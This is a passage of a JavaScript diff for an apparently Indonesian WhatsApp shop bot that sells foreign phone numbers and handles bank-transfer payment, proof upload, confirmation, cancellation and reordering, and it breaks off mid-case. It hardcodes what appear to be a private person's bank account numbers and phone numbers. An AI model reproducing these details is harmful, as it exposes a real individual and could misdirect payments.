+            buttonParamsJson: JSON.stringify({
+                title: "Melanjutkan Pembayaran",
+                sections: [
+                    {
+                        title: "Pilih Metode Pembayaran",
+                        rows: [
+                            { title: "Transfer Bank", id: "transfer_bank", description: "Transfer melalui bank" },
+                            { title: "E-Wallet", id: "ewallet", description: "Pembayaran menggunakan e-wallet" }
+                            ]
+                    }
+                ]
+            })
+        }
+    ];
+
+    const paymentText = `🛒 *Pembayaran untuk Produk*\n\n` +
+        `- Produk: Nomor Jerman\n` +
+        `- Harga: Rp 30.000\n\n` +
+        `👉 Pilih metode pembayaran untuk melanjutkan transaksi.`;
+
+    try {
+        const msg = generateWAMessageFromContent(
+            m.chat,
+            {
+                viewOnceMessage: {
+                    message: {
+                        messageContextInfo: {
+                            deviceListMetadata: {},
+                            deviceListMetadataVersion: 2
+                        },
+                        interactiveMessage: proto.Message.InteractiveMessage.create({
+                            body: proto.Message.InteractiveMessage.Body.create({
+                                text: paymentText
+                            }),
+                            footer: proto.Message.InteractiveMessage.Footer.create({
+                                text: botname
+                            }),
+                            header: proto.Message.InteractiveMessage.Header.create({
+                                title: 'Pembayaran Produk Jerman',
+                                subtitle: 'Melanjutkan Pembayaran',
+                            }),
+                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                                buttons: button
+                            })
+                        })
+                    }
+                }
+            },
+            { quoted: fkontak }
+        );
+
+        console.log("Pesan berhasil dibuat:", msg); // Debugging
+        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
+        console.log("Pesan berhasil dikirim."); // Debugging
+    } catch (error) {
+        console.error("Terjadi kesalahan:", error); // Debugging jika error terjadi
+    }
+}
+break;
+
+case 'produk_japan': {
+    console.log("Produk Jepang dipilih."); // Debugging
+
+    // Data produk Jepang
+    let button = [
+        {
+            name: "single_select",
+            buttonParamsJson: JSON.stringify({
+                title: "Melanjutkan Pembayaran",
+                sections: [
+                    {
+                        title: "Pilih Metode Pembayaran",
+                        rows: [
+                            { title: "Transfer Bank", id: "transfer_bank", description: "Transfer melalui bank" },
+                            { title: "E-Wallet", id: "ewallet", description: "Pembayaran menggunakan e-wallet" }
+                        ]
+                    }
+                ]
+            })
+        }
+    ];
+
+    const paymentText = `🛒 *Pembayaran untuk Produk*\n\n` +
+        `- Produk: Nomor Jepang\n` +
+        `- Harga: Rp 35.000\n\n` +
+        `👉 Pilih metode pembayaran untuk melanjutkan transaksi.`;
+
+    try {
+        const msg = generateWAMessageFromContent(
+            m.chat,
+            {
+                viewOnceMessage: {
+                    message: {
+                        messageContextInfo: {
+                            deviceListMetadata: {},
+                            deviceListMetadataVersion: 2
+                        },
+                        interactiveMessage: proto.Message.InteractiveMessage.create({
+                            body: proto.Message.InteractiveMessage.Body.create({
+                                text: paymentText
+                            }),
+                            footer: proto.Message.InteractiveMessage.Footer.create({
+                                text: botname
+                            }),
+                            header: proto.Message.InteractiveMessage.Header.create({
+                                title: 'Pembayaran Produk Jepang',
+                                subtitle: 'Melanjutkan Pembayaran',
+                            }),
+                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                                buttons: button
+                            })
+                        })
+                    }
+                }
+            },
+            { quoted: fkontak }
+        );
+
+        console.log("Pesan berhasil dibuat:", msg); // Debugging
+        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
+        console.log("Pesan berhasil dikirim."); // Debugging
+    } catch (error) {
+        console.error("Terjadi kesalahan:", error); // Debugging jika error terjadi
+    }
+}
+break;
+
+case 'transfer_bank': {
+    console.log("Case 'transfer_bank' dijalankan."); // Debugging
+
+    // Data bank
+    const banks = [
+        { title: "Bank BRI", id: "bank_bri", description: "Nomor Rekening: 574701011764505 - Status: 🟢" },
+        { title: "Bank CIMB", id: "bank_cimb", description: "Nomor Rekening: 763802276000 - Status: 🟢" }
+    ];
+
+    // Pesan instruksi
+    let instructionText = "💳 *Informasi Rekening Bank*\n\nPilih bank untuk melakukan transfer.";
+
+    // Tombol interaktif
+    let buttons = [
+        {
+            name: "single_select",
+            buttonParamsJson: JSON.stringify({
+                title: "Pilih Bank untuk Transfer",
+                sections: [
+                    {
+                        title: "Bank Transfer",
+                        rows: banks.map(bank => ({
+                            title: bank.title,
+                            id: bank.id, // Menggunakan ID bank langsung
+                            description: bank.description
+                        }))
+                    }
+                ]
+            })
+        }
+    ];
+
+    // Membuat pesan interaktif untuk memilih bank
+    try {
+        const msg = generateWAMessageFromContent(
+            m.chat,
+            {
+                viewOnceMessage: {
+                    message: {
+                        messageContextInfo: {
+                            deviceListMetadata: {},
+                            deviceListMetadataVersion: 2
+                        },
+                        interactiveMessage: proto.Message.InteractiveMessage.create({
+                            body: proto.Message.InteractiveMessage.Body.create({
+                                text: instructionText
+                            }),
+                            footer: proto.Message.InteractiveMessage.Footer.create({
+                                text: "Setelah transfer, silakan kirimkan bukti pembayaran untuk konfirmasi."
+                            }),
+                            header: proto.Message.InteractiveMessage.Header.create({
+                                title: 'Pilih Bank untuk Pembayaran',
+                                subtitle: 'Pilih Bank Anda',
+                            }),
+                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                                buttons: buttons
+                            })
+                        })
+                    }
+                }
+            },
+            { quoted: fkontak }
+        );
+
+        console.log("Pesan berhasil dibuat:", msg); // Debugging
+        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
+        console.log("Pesan berhasil dikirim."); // Debugging
+    } catch (error) {
+        console.error("Terjadi kesalahan:", error); // Debugging jika error terjadi
+    }
+}
+break;
+
+case 'bank_bri': {
+    console.log("Case 'bank_bri' dijalankan."); // Debugging
+
+    // Proses konfirmasi pembayaran atau instruksi lainnya untuk Bank BRI
+    const confirmationText = `
+            *${n}BANK BRI${n}*
+            *${n}ATAS NAMA : GALANG${n}* 
+            *${n}Nomor Rekening : 574701011764505${n}*
+            *${n}STATUS :${n}* 🟢
+        
+    `;
+
+    // Tombol interaktif
+    let button = [
+        {
+            name: "single_select",
+        buttonParamsJson: JSON.stringify({
+            title: "Proses Transaksi",
+            sections: [
+                {
+                    title: "Confirm Transaksi",
+                    rows: [
+                        { title: "Confirm", id: "confirm_bri_payment", description: "Konfirmasi Pembayaran BRI" },
+                        { title: "Upload", id: "upload_bri_proof", description: "Kirim Bukti Transfer BRI" }
+                    ]
+                }
+            ]
+        })
+    },
+    {
+        name: "cta_copy",
+        buttonParamsJson: JSON.stringify({
+            display_text: "Salin",
+            copy_code: "574701011764505"
+        })
+    }
+];
+
+    try {
+        const msg = generateWAMessageFromContent(
+            m.chat,
+            {
+                viewOnceMessage: {
+                    message: {
+                        messageContextInfo: {
+                            deviceListMetadata: {},
+                            deviceListMetadataVersion: 2
+                        },
+                        interactiveMessage: proto.Message.InteractiveMessage.create({
+                            body: proto.Message.InteractiveMessage.Body.create({
+                                text: confirmationText
+                            }),
+                            footer: proto.Message.InteractiveMessage.Footer.create({
+                                text: "Setelah transfer, silakan kirimkan bukti pembayaran untuk konfirmasi."
+                            }),
+                            header: proto.Message.InteractiveMessage.Header.create({
+                                title: 'Konfirmasi Pembayaran Bank BRI',
+                                subtitle: 'Terima kasih atas pembayaran Anda!',
+                            }),
+                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                                buttons: button
+                            })
+                        })
+                    }
+                }
+            },
+            { quoted: fkontak }
+        );
+
+        console.log("Pesan berhasil dibuat:", msg); // Debugging
+        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
+        console.log("Pesan berhasil dikirim."); // Debugging
+    } catch (error) {
+        console.error("Terjadi kesalahan:", error); // Debugging jika error terjadi
+    }
+}
+break;
+
+case 'confirm_bri_payment': {
+const name = getUserName(m.sender);
+    console.log("Case 'confirm_bri_payment' dijalankan."); // Debugging
+
+    // Pesan konfirmasi pembayaran
+    const confirmationText = `
+⚠️ *Pending Transaksi:*
+
+📌 *BANK BRI* 
+- ATAS NAMA: GALANG
+- Nomor Rekening: 574701011764505
+
+⚠️ Hai ${name} tunggu konfirmasi dari owner jika sudah "done" maka transaksi akan dilanjutkan.\n\n🔴 Jika ${name} belum melampirkan bukti screenshot harap kembali ke tombol *${n}Proses Transaksi${n}\n\n📬 Mengirim Pesan otomatis ke owner : *${n}Konfirmasi Pembayaran dari ${name} mohon segera di cek, agar bisa melanjutkan proses selanjutnya, Terimakasih${n}*)`;
+
+    // Tombol interaktif
+    let button = [
+        {
+            name: "single_select",
+            buttonParamsJson: JSON.stringify({
+                title: "Tutup Transaksi",
+                sections: [
+                    {
+                        title: "Close",
+                        rows: [
+                            { title: "Tutup", id: "close_payment", description: "Selesai" }
+                        ]
+                    }
+                ]
+            })
+        }
+    ];
+
+    try {
+        const msg = generateWAMessageFromContent(
+            m.chat,
+            {
+                viewOnceMessage: {
+                    message: {
+                        interactiveMessage: proto.Message.InteractiveMessage.create({
+                            body: proto.Message.InteractiveMessage.Body.create({
+                                text: confirmationText
+                            }),
+                            footer: proto.Message.InteractiveMessage.Footer.create({
+                                text: "Klik tombol di bawah untuk aksi lanjutan."
+                            }),
+                            header: proto.Message.InteractiveMessage.Header.create({
+                                title: 'Status Pending 🔴',
+                                subtitle: 'Pembayaran Anda telah berhasil diterima!'
+                            }),
+                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                                buttons: button
+                            })
+                        })
+                    }
+                }
+            },
+            { quoted: fkontak }
+        );
+
+        console.log("Pesan berhasil dibuat:", msg); // Debugging
+        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
+        console.log("Pesan berhasil dikirim."); // Debugging
+
+        // Mengirim pesan otomatis ke owner
+        const sender = m.sender;
+        await sych.sendMessage('50251731838@s.whatsapp.net', {
+            text: `*${n}Konfirmasi Pembayaran dari ${name} mohon segera di cek, agar bisa melanjutkan proses selanjutnya, Terimakasih${n}*\n\n@${sender.split('@')[0]}`,
+            mentions: [sender]
+        }, { quoted: fkontak });
+
+        console.log("Pesan berhasil dibuat:", msg); // Debugging
+        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
+        console.log("Pesan berhasil dikirim."); // Debugging
+    } catch (error) {
+        console.error("Terjadi kesalahan saat memproses confirm_cimb_payment:", error); // Debugging
+    }
+}
+break;
+
+
+//UPLOAD
+case 'upload_bri_proof': {
+    console.log("Case 'upload_bri_proof' dijalankan."); // Debugging
+
+    // Pesan instruksi pengunggahan
+    const confirmationText = `
+📝 *Instruksi Pengunggahan Bukti Transfer:*
+1. Pastikan bukti transfer terlihat jelas.
+2. Screnshoot yang diterima: JPG, PNG, atau PDF.
+3. Kirim bukti transfer Anda dengan Screnshoot.
+
+📌 *Bank BRI:* 
+- ATAS NAMA: GALANG
+- Nomor Rekening: 574701011764505
+    `;
+
+    // Tombol interaktif
+    let button = [
+        {
+            name: "single_select",
+            buttonParamsJson: JSON.stringify({
+                title: "Next",
+                sections: [
+                    {
+                        title: "Lanjutkan Transaksi",
+                        rows: [
+                            { title: "Kirim Bukti", id: "submit_dana_proof", description: "Unggah Screnshot bukti transfer" }
+                        ]
+                    }
+                ]
+            })
+        },
+
+
+
+
+    ];
+
+
+try {
+    // Path ke file gambar lokal
+    const imagePath = './src/media/brii.png'; // Ganti dengan path yang sesuai
+
+    // Membaca gambar dari file lokal
+    const imageBuffer = fs.readFileSync(imagePath);
+
+    // Menyiapkan media (gambar)
+    const mediaMessage = await prepareWAMessageMedia(
+        { image: imageBuffer }, // Menggunakan buffer gambar lokal
+        { upload: sych.waUploadToServer }
+    );
+
+    // Membuat pesan dengan gambar
+    const msg = generateWAMessageFromContent(
+        m.chat,
+        {
+            viewOnceMessage: {
+                message: {
+                    interactiveMessage: proto.Message.InteractiveMessage.create({
+                        body: proto.Message.InteractiveMessage.Body.create({
+                            text: confirmationText
+                        }),
+                        footer: proto.Message.InteractiveMessage.Footer.create({
+                            text: "Klik tombol di bawah untuk melanjutkan transaksi."
+                        }),
+                        header: proto.Message.InteractiveMessage.Header.create({
+                            ...mediaMessage, // Menambahkan gambar yang sudah disiapkan
+                            title: 'Pengunggahan Bukti Transfer BRI',
+                            subtitle: 'Pastikan bukti transfer terlihat jelas.',
+                            hasMediaAttachment: true, // Menandakan bahwa ada media
+                        }),
+                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                            buttons: button
+                        })
+                    })
+                }
+            }
+        },
+        { quoted: fkontak }
+    );
+
+        console.log("Pesan berhasil dibuat:", msg); // Debugging
+        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
+        console.log("Pesan berhasil dikirim."); // Debugging
+    } catch (error) {
+        console.error("Terjadi kesalahan saat memproses upload_bri_proof:", error); // Debugging
+    }
+}
+break;
+
+
+case 'close_payment': {
+    console.log("Case 'close_payment' dijalankan."); // Debugging
+
+    // Pesan untuk menutup transaksi
+    const closingText = `
+⚠️ *Transaksi Telah Ditutup:*
+Jika Anda membutuhkan bantuan lebih lanjut, jangan ragu untuk menghubungi kami.
+
+✨ Semoga hari Anda menyenangkan!
+    `;
+    let button = [
+        {
+            name: "single_select",
+            buttonParamsJson: JSON.stringify({
+                title: "Status Pembatalan",
+                sections: [
+                    {
+                        title: "Pilihan Lainnya",
+                        rows: [
+                            { title: "Pesan Ulang", id: "reorder", description: "Pesan ulang produk ini" },
+                            { title: "Hubungi CS", id: "contact_cs", description: "Hubungi customer service" }
+                        ]
+                    }
+                ]
+            })
+        }
+    ];
+
+    try {
+        const msg = generateWAMessageFromContent(
+            m.chat,
+            {
+                viewOnceMessage: {
+                    message: {
+                        interactiveMessage: proto.Message.InteractiveMessage.create({
+                            body: proto.Message.InteractiveMessage.Body.create({
+                                text: closingText
+                            }),
+                            footer: proto.Message.InteractiveMessage.Footer.create({
+                                text: "©Langz!"
+                            }),
+                            header: proto.Message.InteractiveMessage.Header.create({
+                                title: 'Transaksi Selesai',
+                                subtitle: 'Terima kasih atas pembayaran Anda!'
+                            }),
+                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                                buttons: button
+                            }) // Tidak ada tombol, hanya menutup
+                        })
+                    }
+                }
+            },
+            { quoted: fkontak }
+        );
+
+        console.log("Pesan berhasil dibuat:", msg); // Debugging
+        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
+        console.log("Pesan berhasil dikirim."); // Debugging
+    } catch (error) {
+        console.error("Terjadi kesalahan saat memproses close_payment:", error); // Debugging
+    }
+}
+break;
+
+case 'submit_bri_proof': {
+    console.log("Case 'submit_bri_proof' dijalankan."); // Debugging
+
+    // Pesan konfirmasi pengunggahan bukti
+    const proofSubmissionText = `
+
+⚠️ *Catatan:* Pastikan Screnshoot terlihat jelas dan sesuai dengan instruksi yang diberikan.
+    `;
+
+    // Tombol interaktif
+    let button = [
+        {
+            name: "single_select",
+            buttonParamsJson: JSON.stringify({
+                title: "Kirim Bukti",
+                sections: [
+                    {
+                        title: "Proses Unggah",
+                        rows: [
+                            { title: "Sudah Upload", id: "upload_file", description: "Klik jika Anda sudah mengupload bukti" },
+                            { title: "Batalkan Pesanan", id: "cancel_order", description: "Klik untuk membatalkan pesanan" }
+                        ]
+                    }
+                ]
+            })
+        }
+    ];
+
+    try {
+        const msg = generateWAMessageFromContent(
+            m.chat,
+            {
+                viewOnceMessage: {
+                    message: {
+                        interactiveMessage: proto.Message.InteractiveMessage.create({
+                            body: proto.Message.InteractiveMessage.Body.create({
+                                text: proofSubmissionText
+                            }),
+                            footer: proto.Message.InteractiveMessage.Footer.create({
+                                text: "Silakan unggah bukti Anda."
+                            }),
+                            header: proto.Message.InteractiveMessage.Header.create({
+                                title: 'Unggah Bukti Transfer',
+                                subtitle: 'Pengunggahan bukti transfer Anda.'
+                            }),
+                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                                buttons: button
+                            })
+                        })
+                    }
+                }
+            },
+            { quoted: fkontak }
+        );
+
+        console.log("Pesan berhasil dibuat:", msg); // Debugging
+        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
+        console.log("Pesan berhasil dikirim."); // Debugging
+    } catch (error) {
+        console.error("Terjadi kesalahan saat memproses submit_bri_proof:", error); // Debugging
+    }
+}
+break;
+
+case 'upload_file': {
+    console.log("Case 'upload_file' dijalankan."); // Debugging
+const name = getUserName(m.sender);
+        const sender = m.sender;
+    // Pesan untuk memberitahukan bahwa pembayaran akan dicek
+    const fileUploadText = `
+📥 *Bukti Transfer Anda Sedang Diperiksa:*
+Pembayaran Anda akan segera di cek, harap menunggu beberapa saat, Owner akan segera merespon.\n\n${n}📬 Mengirim Pesan Ke Owner : ${name} sudah mengirimkan bukti transaksi mohon segera di cek${n}\n\nTerimakasih
+
+🔍 Jika ada masalah atau kendala, jangan ragu untuk menghubungi owner.
+    `;
+
+    // Tombol interaktif
+    let button = [
+        {
+            name: "single_select",
+            buttonParamsJson: JSON.stringify({
+                title: "Proses Transaksi",
+                sections: [
+                    {
+                        title: "Status Pembayaran",
+                        rows: [
+                            { title: "Batalkan Order", id: "cancel_order", description: "Batalkan pesanan Anda" }
+                        ]
+                    }
+                ]
+            })
+        }
+    ];
+
+    try {
+        const msg = generateWAMessageFromContent(
+            m.chat,
+            {
+                viewOnceMessage: {
+                    message: {
+                        interactiveMessage: proto.Message.InteractiveMessage.create({
+                            body: proto.Message.InteractiveMessage.Body.create({
+                                text: fileUploadText
+                            }),
+                            footer: proto.Message.InteractiveMessage.Footer.create({
+                                text: "Pembayaran Anda sedang kami verifikasi."
+                            }),
+                            header: proto.Message.InteractiveMessage.Header.create({
+                                title: 'Verifikasi Pembayaran',
+                                subtitle: 'Tunggu sebentar, pembayaran sedang diperiksa.'
+                            }),
+                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                                buttons: button
+                            })
+                        })
+                    }
+                }
+            },
+            { quoted: fkontak }
+        );
+// Mengirim pesan otomatis ke owner
+
+        await sych.sendMessage('50251731838@s.whatsapp.net', {
+            text: `*${n}${name} mengirimkan bukti transaksi mohon segera di cek${n}*\n\nTerimakasih`,
+            mentions: [sender]
+        }, { quoted: fkontak });
+        console.log("Pesan berhasil dibuat:", msg); // Debugging
+        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
+        console.log("Pesan berhasil dikirim."); // Debugging
+    } catch (error) {
+        console.error("Terjadi kesalahan saat mengirim upload_file:", error); // Debugging
+    }
+}
+break;
+
+case 'cancel_order': {
+    console.log("Case 'cancel_order' dijalankan."); // Debugging
+
+    // Pesan untuk memberitahukan bahwa order dibatalkan
+    const cancelOrderText = `
+❌ *Pesanan Anda Telah Dibatalkan:*
+Kami mohon maaf atas ketidaknyamanan ini. Jika Anda ingin melakukan pemesanan kembali, silakan hubungi kami.
+
+Jika ada pertanyaan, jangan ragu untuk menghubungi customer service kami.
+    `;
+
+    // Tombol interaktif
+    let button = [
+        {
+            name: "single_select",
+            buttonParamsJson: JSON.stringify({
+                title: "Status Pembatalan",
+                sections: [
+                    {
+                        title: "Pilihan Lainnya",
+                        rows: [
+                            { title: "Pesan Ulang", id: "reorder", description: "Pesan ulang produk ini" },
+                            { title: "Hubungi Owner", id: "contact_cs", description: "Hubungi customer service" }
+                        ]
+                    }
+                ]
+            })
+        }
+    ];
+
+    try {
+        const msg = generateWAMessageFromContent(
+            m.chat,
+            {
+                viewOnceMessage: {
+                    message: {
+                        interactiveMessage: proto.Message.InteractiveMessage.create({
+                            body: proto.Message.InteractiveMessage.Body.create({
+                                text: cancelOrderText
+                            }),
+                            footer: proto.Message.InteractiveMessage.Footer.create({
+                                text: "Pesanan telah dibatalkan."
+                            }),
+                            header: proto.Message.InteractiveMessage.Header.create({
+                                title: 'Pembatalan Pesanan',
+                                subtitle: 'Pesanan Anda telah dibatalkan.'
+                            }),
+                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                                buttons: button
+                            })
+                        })
+                    }
+                }
+            },
+            { quoted: fkontak }
+        );
+
+        console.log("Pesan berhasil dibuat:", msg); // Debugging
+        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
+        console.log("Pesan berhasil dikirim."); // Debugging
+    } catch (error) {
+        console.error("Terjadi kesalahan saat mengirim cancel_order:", error); // Debugging
+    }
+}
+break;
+
+
+case 'contact_cs': {
+    console.log("Case 'contact_cs' dijalankan."); // Debugging
+
+    // Pesan untuk mengarahkan ke customer service
+    const contactCSText = `
+📞 *Hubungi Owner*:
+Untuk bantuan lebih lanjut, Anda bisa langsung menghubungi Owner melalui panggilan telepon.
+
+Jika Anda memerlukan bantuan lebih lanjut, bot kami siap membantu Anda!
+    `;
+
+    // Tombol interaktif untuk menghubungi customer service (CTA Call)
+    let button = [
+        {
+            name: "single_select",
+            buttonParamsJson: JSON.stringify({
+                title: "Hubungi Owner",
+                sections: [
+                    {
+                        title: "Kontak Owner",
+                        rows: [
+                            {
+                                title: "Panggilan Owner",
+                                id: "pepek",
+                                description: "Hubungi Owner melalui Whatsapp / Telepon",
+                                phone_number: "+6288274119688"
+                            }
+                        ]
+                    }
+                ]
+            })
+        }
+    ];
+
+    try {
+        const msg = generateWAMessageFromContent(
+            m.chat,
+            {
+                viewOnceMessage: {
+                    message: {
+                        interactiveMessage: proto.Message.InteractiveMessage.create({
+                            body: proto.Message.InteractiveMessage.Body.create({
+                                text: contactCSText
+                            }),
+                            footer: proto.Message.InteractiveMessage.Footer.create({
+                                text: "Owner siap membantu Anda!"
+                            }),
+                            header: proto.Message.InteractiveMessage.Header.create({
+                                title: 'Hubungi Owner',
+                                subtitle: 'Untuk informasi lebih lanjut.'
+                            }),
+                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                                buttons: button
+                            })
+                        })
+                    }
+                }
+            },
+            { quoted: fkontak }
+        );
+
+        console.log("Pesan berhasil dibuat:", msg); // Debugging
+        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
+        console.log("Pesan berhasil dikirim."); // Debugging
+    } catch (error) {
+        console.error("Terjadi kesalahan saat menghubungi CS:", error); // Debugging
+    }
+}
+break;
+
+case 'reorder': {
+    console.log("Case 'reorder' dijalankan."); // Debugging
+
+    // Daftar produk yang telah didefinisikan sebelumnya
+    const products = [
+        { title: "Nomor USA", id: "produk_usa", description: "Harga: Rp 20.000 - Tersedia" },
+        { title: "Nomor UK", id: "produk_uk", description: "Harga: Rp 25.000 - Tersedia" },
+        { title: "Nomor Kanada", id: "produk_canada", description: "Harga: Rp 22.000 - Tersedia" },
+        { title: "Nomor Jerman", id: "produk_germany", description: "Harga: Rp 30.000 - Tersedia" },
+        { title: "Nomor Jepang", id: "produk_japan", description: "Harga: Rp 35.000 - Tersedia" }
+    ];
+
+
+    // Pesan untuk pengulangan produk yang telah dibeli
+    const reorderText = `
+🔄 *Pesanan Anda Dapat Diulang!*
+Anda dapat memilih produk yang ingin dipesan ulang dari daftar produk yang sebelumnya telah Anda pilih.
+Silakan pilih produk untuk memulai proses reorder.
+    `;
+
+    // Tombol interaktif menggunakan produk yang sudah ada
+    let button = [
+        {
+            name: "single_select",
+            buttonParamsJson: JSON.stringify({
+                title: "Pilih Produk untuk Dipesan Ulang",
+                sections: [
+                    {
+                        title: "Produk Pilihan",
+                        rows: products.map(product => ({
+                            title: product.title,
+                            id: product.id,
+                            description: product.description
+                        }))
+                    }
+                ]
+            })
+        }
+    ];
+
+    try {
+        const msg = generateWAMessageFromContent(
+            m.chat,
+            {
+                viewOnceMessage: {
+                    message: {
+                        interactiveMessage: proto.Message.InteractiveMessage.create({
+                            body: proto.Message.InteractiveMessage.Body.create({
+                                text: reorderText
+                            }),
+                            footer: proto.Message.InteractiveMessage.Footer.create({
+                                text: "Pilih produk untuk dipesan ulang."
+                            }),
+                            header: proto.Message.InteractiveMessage.Header.create({
+                                title: 'Pesan Ulang Produk',
+                                subtitle: 'Pilih produk dari daftar untuk memulai pemesanan ulang.'
+                            }),
+                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                                buttons: button
+                            })
+                        })
+                    }
+                }
+            },
+            { quoted: fkontak }
+        );
+
+        console.log("Pesan berhasil dibuat:", msg); // Debugging
+        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
+        console.log("Pesan berhasil dikirim."); // Debugging
+    } catch (error) {
+        console.error("Terjadi kesalahan saat memproses reorder:", error); // Debugging
+    }
+}
+break;
+
+//2
+//BANK CIMB
+
+case 'bank_cimb': {
+    console.log("Case 'bank_cimb' dijalankan."); // Debugging
+
+    // Proses konfirmasi pembayaran atau instruksi lainnya untuk Bank BRI
+    const confirmationText = `
+            *${n}BANK CIMB${n}*
+            *${n}ATAS NAMA : GALANG${n}* 
+            *${n}Nomor Rekening : 763802276000${n}*
+            *${n}STATUS :${n}* 🟢
+        
+    `;
+
+    // Tombol interaktif
+  let button = [
+        {
+            name: "single_select",
+        buttonParamsJson: JSON.stringify({
+            title: "Proses Transaksi",
+            sections: [
+                {
+                    title: "Confirm Transaksi",
+                    rows: [
+                        { title: "Confirm", id: "confirm_cimb_payment", description: "Konfirmasi Pembayaran CIMB" },
+                        { title: "Upload", id: "upload_cimb_proof", description: "Kirim Bukti Transfer CIMB" }
+                    ]
+                }
+            ]
+        })
+    },
+    {
+        name: "cta_copy",
+        buttonParamsJson: JSON.stringify({
+            display_text: "Salin",
+            copy_code: "763802276000"
+        })
+    }
+];
+
+    try {
+        const msg = generateWAMessageFromContent(
+            m.chat,
+            {
+                viewOnceMessage: {
+                    message: {
+                        messageContextInfo: {
+                            deviceListMetadata: {},
+                            deviceListMetadataVersion: 2
+                        },
+                        interactiveMessage: proto.Message.InteractiveMessage.create({
+                            body: proto.Message.InteractiveMessage.Body.create({
+                                text: confirmationText
+                            }),
+                            footer: proto.Message.InteractiveMessage.Footer.create({
+                                text: "Setelah transfer, silakan kirimkan bukti pembayaran untuk konfirmasi."
+                            }),
+                            header: proto.Message.InteractiveMessage.Header.create({
+                                title: 'Konfirmasi Pembayaran Bank CIMB',
+                                subtitle: 'Terima kasih atas pembayaran Anda!',
+                            }),
+                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                                buttons: button
+                            })
+                        })
+                    }
+                }
+            },
+            { quoted: fkontak }
+        );
+
+        console.log("Pesan berhasil dibuat:", msg); // Debugging
+        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
+        console.log("Pesan berhasil dikirim."); // Debugging
+    } catch (error) {
+        console.error("Terjadi kesalahan:", error); // Debugging jika error terjadi
+    }
+}
+break;
+
+case 'confirm_cimb_payment': {
+
+    const name = getUserName(m.sender);
+    console.log("Case 'confirm_cimb_payment' dijalankan."); // Debugging
+
+    // Pesan konfirmasi pembayaran
+    const confirmationText = `
+⚠️ *Pending Transaksi:*
+
+📌 *BANK CIMB* 
+- ATAS NAMA: GALANG
+- Nomor Rekening: 763802276000
+
+⚠️ Hai ${name} tunggu konfirmasi dari owner jika sudah "done" maka transaksi akan dilanjutkan.\n\n🔴 Jika ${name} belum melampirkan bukti screenshot harap kembali ke tombol *${n}Proses Transaksi${n}\n\n📬 Mengirim Pesan otomatis ke owner : *${n}Konfirmasi Pembayaran dari ${name} mohon segera di cek, agar bisa melanjutkan proses selanjutnya, Terimakasih${n}*`;
+
+    // Tombol interaktif
+    let button = [
+        {
+            name: "single_select",
+            buttonParamsJson: JSON.stringify({
+                title: "Tutup Transaksi",
+                sections: [
+                    {
+                        title: "Close",
+                        rows: [
+                            { title: "Tutup", id: "close_payment", description: "Selesai" }
+                        ]
+                    }
+                ]
+            })
+        }
+    ];
+
+    try {
+        const msg = generateWAMessageFromContent(
+            m.chat,
+            {
+                viewOnceMessage: {
+                    message: {
+                        interactiveMessage: proto.Message.InteractiveMessage.create({
+                            body: proto.Message.InteractiveMessage.Body.create({
+                                text: confirmationText
+                            }),
+                            footer: proto.Message.InteractiveMessage.Footer.create({
+                                text: "Klik tombol di bawah untuk aksi lanjutan."
+                            }),
+                            header: proto.Message.InteractiveMessage.Header.create({
+                                title: 'Status Pending 🔴',
+                                subtitle: 'Pembayaran Anda telah berhasil diterima!'
+                            }),
+                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                                buttons: button
+                            })
+                        })
+                    }
+                }
+            },
+            { quoted: fkontak }
+        );
+
+        console.log("Pesan berhasil dibuat:", msg); // Debugging
+        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
+        console.log("Pesan berhasil dikirim."); // Debugging
+
+        // Mengirim pesan otomatis ke owner
+        const sender = m.sender;
+        await sych.sendMessage('50251731838@s.whatsapp.net', {
+            text: `*${n}Konfirmasi Pembayaran dari ${name} mohon segera di cek, agar bisa melanjutkan proses selanjutnya, Terimakasih${n}*\n\n@${sender.split('@')[0]}`,
+            mentions: [sender]
+        }, { quoted: fkontak });
+
+        console.log("Pesan otomatis ke owner berhasil dikirim."); // Debugging
+
+    } catch (error) {
+        console.error("Terjadi kesalahan saat memproses confirm_cimb_payment:", error); // Debugging
+    }
+}
+break;
+
+
+//UPLOAD
+case 'upload_cimb_proof': {
+    console.log("Case 'upload_cimb_proof' dijalankan."); // Debugging
+
+    // Pesan instruksi pengunggahan
+    const confirmationText = `
+📝 *Instruksi Pengunggahan Bukti Transfer:*
+1. Pastikan bukti transfer terlihat jelas.
+2. Screnshoot yang diterima: JPG, PNG, atau PDF.
+3. Kirim bukti transfer Anda dengan Screnshoot.
+
+📌 *BANK CIMB:* 
+- ATAS NAMA: GALANG
+- Nomor Rekening: 763802276000
+    `;
+
+    // Tombol interaktif
